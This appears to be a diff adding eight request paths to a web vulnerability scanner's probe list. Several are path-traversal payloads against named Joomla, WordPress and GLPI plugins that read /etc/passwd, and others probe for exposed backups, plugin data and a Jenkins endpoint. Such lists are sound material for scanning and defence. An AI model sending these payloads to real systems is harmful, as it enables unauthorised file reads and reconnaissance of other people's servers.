@@ -1,0 +1,8 @@
+/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd
+/?option=com_helpdeskpro&task=ticket.download_attachment&filename=/../../../../../../../../../../../../etc/passwd&original_filename=AnyFileName.exe
+/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+/wp-json/acf/v3/options/a?id=active&field=plugins
+/wp-content/uploads/wp-file-manager-pro/fm_backup/
+/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
+/git/notifyCommit?url={{randstr}}&branches={{randstr}}
